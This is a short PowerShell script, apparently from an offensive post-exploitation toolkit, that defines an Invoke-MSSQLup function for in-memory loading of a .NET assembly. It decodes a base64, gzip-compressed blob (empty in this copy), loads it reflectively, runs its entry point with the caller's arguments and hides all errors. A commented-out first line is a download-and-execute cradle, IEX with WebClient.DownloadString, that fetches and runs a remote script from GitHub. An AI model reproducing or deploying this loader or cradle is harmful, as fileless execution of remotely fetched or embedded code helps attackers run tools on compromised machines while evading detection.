#IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-NETMongoose.ps1")
Function Invoke-MSSQLup {
    param ($Command)
$b64Str = ''
$b64Str = $b64Str -replace '\s',''  # Remove whitespace

if (![string]::IsNullOrWhiteSpace($b64Str)) {
    try {
        $compBytes = [Convert]::FromBase64String($b64Str)

        if ($compBytes -and $compBytes.Count -gt 0) {
            $compStream = New-Object System.IO.MemoryStream($compBytes, 0, $compBytes.Length)
            $gzipStream = New-Object System.IO.Compression.GzipStream($compStream, [System.IO.Compression.CompressionMode]::Decompress)
            $decompStream = New-Object System.IO.MemoryStream
            $buf = New-Object byte[](4096)

            do {
                $read = $gzipStream.Read($buf, 0, $buf.Length)
                if ($read -gt 0) { $decompStream.Write($buf, 0, $read) }
            } while ($read -gt 0)

            $gzipStream.Close()
            $compStream.Close()

            $decompStream.Position = 0
            $decompBytes = $decompStream.ToArray()
            $decompStream.Close()

            $asm = [System.Reflection.Assembly]::Load($decompBytes)
            $entry = $asm.EntryPoint
            $Output = $entry.Invoke($null, @((,($Command -split ' '))))
            $Output = $Output.Trim()
            $Output | FT
        } else {}} catch {}} else {}
}
